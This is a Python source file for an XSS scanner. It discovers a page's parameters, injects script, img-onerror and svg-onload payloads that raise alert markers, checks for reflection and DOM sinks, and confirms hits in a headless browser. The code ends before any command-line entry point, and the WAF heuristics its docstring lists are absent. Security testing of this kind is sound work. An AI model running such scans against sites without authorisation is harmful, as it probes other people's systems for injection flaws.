#!/usr/bin/env python3
#requirements:
"""pip install aiohttp playwright beautifulsoup4
playwright install
"""
"""
XSS Scanner

Features:
- Async scanning
- Context-aware reflection
- Headless browser verification
- DOM XSS detection
- Auto parameter discovery
- WAF heuristics
- JSON reporting
"""

import argparse
import asyncio
import aiohttp
import urllib.parse
import json
import random
import string
import html
from bs4 import BeautifulSoup
from playwright.async_api import async_playwright

# =========================
# RANDOM MARKER (CRITICAL)
# =========================
def generate_marker(length=6):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

# =========================
# PAYLOAD FACTORY
# =========================
def build_payloads(marker):
    return [
        f"<script>alert('{marker}')</script>",
        f"\"><script>alert('{marker}')</script>",
        f"'><img src=x onerror=alert('{marker}')>",
        f"<svg/onload=alert('{marker}')>",
    ]

# =========================
# REFLECTION DETECTION
# =========================
def is_reflected(marker, body):
    body_lower = body.lower()

    checks = [
        marker.lower(),
        html.escape(marker.lower()),
        urllib.parse.quote(marker.lower()),
        urllib.parse.quote_plus(marker.lower()),
    ]

    return any(c in body_lower for c in checks)

# =========================
# DOM XSS CHECK
# =========================
def dom_xss_check(body):
    sinks = [
        ".innerhtml",
        "document.write",
        "eval(",
        "settimeout(",
        "setinterval(",
        "location.href",
    ]
    body_lower = body.lower()
    return any(s in body_lower for s in sinks)

# =========================
# PARAM DISCOVERY
# =========================
async def discover_params(session, url):
    params = set()

    try:
        async with session.get(url) as resp:
            text = await resp.text()
            soup = BeautifulSoup(text, "html.parser")

            for tag in soup.find_all(["input", "textarea", "select"]):
                name = tag.get("name")
                if name:
                    params.add(name)

        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        params.update(qs.keys())

    except Exception:
        pass

    return list(params)

# =========================
# REAL BROWSER VERIFY (FIXED)
# =========================
async def browser_verify(test_url, marker):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()

        triggered = False

        async def handle_dialog(dialog):
            nonlocal triggered
            if marker in dialog.message:
                triggered = True
            await dialog.dismiss()

        page.on("dialog", handle_dialog)

        try:
            await page.goto(test_url, wait_until="domcontentloaded", timeout=15000)
            await asyncio.sleep(2)
        except Exception:
            pass

        await browser.close()
        return triggered

# =========================
# SCAN WORKER
# =========================
async def scan_param(session, url, param, sem, findings, verbose):
    async with sem:
        marker = generate_marker()
        payloads = build_payloads(marker)

        for payload in payloads:
            try:
                params = {param: payload}

                async with session.get(url, params=params) as resp:
                    body = await resp.text()
                    status = resp.status

                    reflected = is_reflected(marker, body)
                    dom_flag = dom_xss_check(body)

                    if verbose:
                        print(f"[DEBUG] {param} | status={status} | reflected={reflected}")

                    if reflected or dom_flag:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        verified = await browser_verify(test_url, marker)

                        result = {
                            "param": param,
                            "payload": payload,
                            "status": status,
                            "reflected": reflected,
                            "dom_sink": dom_flag,
                            "verified": verified,
                        }

                        findings.append(result)

                        print(f"\n🎯 POTENTIAL XSS FOUND!")
                        print(f"Param: {param}")
                        print(f"Verified: {verified}")
                        print("-" * 50)

            except Exception as e:
                if verbose:
                    print(f"[ERROR] {e}")

# =========================
# MAIN SCAN
# =========================
async def run_scan(url, concurrency, output, verbose):
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=20)

    findings = []

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

        print("[*] Discovering parameters...")
        params = await discover_params(session, url)

        if not params:
            print("[!] No parameters found — try manual parameter mode")
            return

        print(f"[+] Testing params: {params}")

        sem = asyncio.Semaphore(concurrency)

        tasks = [
            scan_param(session, url, p, sem, findings, verbose)
            for p in params
        ]

        await asyncio.gather(*tasks)

    if output:
        with open(output, "w") as f:
            json.dump(findings, f, indent=2)

    print(f"\n✅ Scan finished | Findings: {len(findings)}")


